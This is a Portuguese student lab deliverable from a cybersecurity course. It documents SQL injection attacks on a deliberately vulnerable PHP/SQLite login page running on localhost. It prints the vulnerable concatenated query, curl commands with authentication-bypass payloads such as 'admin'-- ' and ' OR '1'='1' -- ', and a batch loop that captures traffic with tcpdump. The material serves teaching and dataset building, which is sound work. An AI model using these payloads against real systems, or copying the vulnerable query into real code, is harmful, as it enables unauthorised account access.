# ISPGAYA — COIL | Semana 4 (27–31/10)

Documento de scripts e parâmetros usados nos ataques (entregável 3)

Autores: Miguel Magalhães, Alexandre Marques  
Contexto: Projeto COIL — Ambiente isolado e educativo de cibersegurança  
Grupo: 4 — SQL injection  
Aviso: Todos os cenários foram executados apenas numa rede LAB isolada. Não executar fora de ambiente controlado.

---

## 1) Escopo do Team 4 — SQL injection

Este documento cobre exclusivamente o último entregável (scripts e parâmetros) para o tema do Grupo 4: SQL injection. O alvo é uma aplicação PHP + SQLite com um formulário de login vulnerável por construção de query via concatenação de input.

Objetivos:
- Gerar pedidos HTTP de autenticação válidos e inválidos; 
- Reproduzir acessos por SQLi (ex.: `admin'--`); 
- Capturar simultaneamente pcaps; 
- Registar parâmetros, payloads e evidências (incluindo o header `Flag` na resposta quando a exploração tem sucesso).

---

## 2) Ambiente e convenções

- Servidor alvo (exemplo): `http://127.0.0.1:8000` com Document Root em `COIL - site/public`.
- Endpoint de autenticação: `POST /login.php`.
- Campos do formulário: `username`, `password` (Content-Type: `application/x-www-form-urlencoded`).
- Captura de tráfego local (macOS): interface `lo0` para loopback.  
  - Adapte a interface conforme o vosso LAB (ex.: `eth1`, `en0` ou Docker `eth0`).

Variáveis e pastas:
```zsh
TS=$(date +"%Y%m%d-%H%M%S")
mkdir -p pcaps logs
```

Captura base (paralela):
```zsh
sudo tcpdump -i lo0 -w pcaps/sqli_$TS.pcap 'tcp port 8000 and host 127.0.0.1' &
CAP_PID=$!
```

Para terminar a captura dedicada:
```zsh
kill $CAP_PID
```

---

## 3) Código relevante no alvo (explicação)

Trechos simplificados de `public/login.php` para contextualizar o ataque (não alterar em produção; é intencional para a aula):

```php
// Obtém input do formulário (username/password)
$username = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';

// VULNERÁVEL: concatenação direta de input na SQL (permite SQLi)
$sql = "SELECT * FROM users WHERE username='$username admin' AND password='$password'";
$stmt = $db->query($sql);
$user = $stmt ? $stmt->fetch(PDO::FETCH_ASSOC) : false;

// Verificação segura (prepared statements) para contraste
$safeStmt = $db->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$safeStmt->execute([$username, $password]);
$safeUser = $safeStmt->fetch(PDO::FETCH_ASSOC);

// Se a vulnerável "autenticar" mas a segura não, é sinal de SQLi → envia header Flag
if ($user && !$safeUser) {
  header('Flag: ISPGAYA{SQL_Injection}');
}
```

Notas:
- O sufixo literal ` admin` na condição do username força a exploração; a payload `admin'--` comenta esse sufixo e o restante.
- Este ficheiro é parte do ambiente didático e não deve ser usado como referência de segurança.

---

## 4) Scripts e parâmetros — baseline (login correto)

Credenciais da demonstração: `admin / 1234`.

Objetivo: gerar uma referência “limpa” de login normal (para comparação de pcaps/alertas).

```zsh
# Recomendado: garantir captura em execução (ver secção 2)

# Pedido HTTP com formulário válido
curl -i -s -X POST 'http://127.0.0.1:8000/login.php' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'username=admin&password=1234' \
  | tee logs/login_valid_$TS.http
```

Expectativa:
- Resposta 302 (redirect) para `index.php` sem header `Flag`.
- Registar o ficheiro `logs/login_valid_$TS.http` e o pcap correspondente.

---

## 5) Scripts e parâmetros — SQLi (bypass com comentário)

Payload de bypass: username `admin'--` e qualquer password.

```zsh
curl -i -s -X POST 'http://127.0.0.1:8000/login.php' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode "username=admin'-- " \
  --data-urlencode "password=qualquer" \
  | tee logs/login_sqli_admin_comment_$TS.http
```

Detalhes:
- `--data-urlencode` evita problemas de quoting, preservando o `'` e o `--`.
- O espaço após `--` garante que o comentário SQL é corretamente interpretado.

Expectativa:
- Resposta 302 para `index.php` com header `Flag: ISPGAYA{SQL_Injection}`.
- Sessão iniciada apesar da password errada (devido à SQLi).

---

## 6) Scripts e parâmetros — SQLi (condição sempre verdadeira)

Outra variação: `' OR '1'='1' -- `

```zsh
curl -i -s -X POST 'http://127.0.0.1:8000/login.php' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode "username=' OR '1'='1' -- " \
  --data-urlencode "password=teste" \
  | tee logs/login_sqli_true_$TS.http
```

Expectativa:
- Efeito semelhante: autenticação indevida e presença do header `Flag`.

---

## 7) Automação de payloads (lote controlado)

Para gerar um conjunto de requisições com várias payloads e pcaps nomeados:

```zsh
cat > payloads.txt << 'EOF'
admin'-- 
' OR '1'='1' -- 
admin'/**/OR/**/'1'='1
EOF

while read -r P; do
  TS=$(date +"%Y%m%d-%H%M%S")
  sudo tcpdump -i lo0 -w pcaps/sqli_lote_$TS.pcap 'tcp port 8000 and host 127.0.0.1' &
  CAP=$!
  curl -i -s -X POST 'http://127.0.0.1:8000/login.php' \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    --data-urlencode "username=$P" \
    --data-urlencode "password=x" \
    | tee "logs/login_sqli_lote_${TS}.http"
  kill $CAP
  sleep 1
done < payloads.txt
```

Notas:
- Intervalos (`sleep`) evitam pcaps gigantes e ajudam a mapear request→pcap.

---

## 8) Registo mínimo para cada execução (dataset)

Campos sugeridos para `.csv` por execução:
- `attack_id` (ex.: SQLI_COMMENT_01)
- `payload` (string usada em `username`)
- `alvo` (URL/host)
- `http_status` (ex.: 302)
- `flag_header` (true/false)
- `pcap` (ficheiro gerado)
- `ts_inicio` / `ts_fim` (UTC)
- `observacoes` (ex.: sessão criada; header presente)

Exemplo:

```csv
attack_id,payload,alvo,http_status,flag_header,pcap,ts_inicio,ts_fim,observacoes
SQLI_COMMENT_01,"admin'-- ",http://127.0.0.1:8000/login.php,302,true,pcaps/sqli_20251031-140102.pcap,2025-10-31T14:01:02Z,2025-10-31T14:01:03Z,"Autenticado por SQLi; Flag presente"
```

---

## 9) Boas práticas de LAB

- Snapshots antes de cada ensaio e rollback após captura.
- Apenas rede isolada; nunca reutilizar estas técnicas fora do LAB.
- Guardar versões/ambiente (porta, interface, SO) para reprodutibilidade.

---

## 10) Checklist final (entregável 3 — Team 4)

- [ ] Scripts/comandos de login baseline e SQLi (com parâmetros)  
- [ ] pcaps por execução (nomeados com timestamp)  
- [ ] logs HTTP com headers (para confirmar `Flag`)  
- [ ] CSV de mapeamento (payload ↔ status/flag/pcap)  
- [ ] Observações e notas do LAB

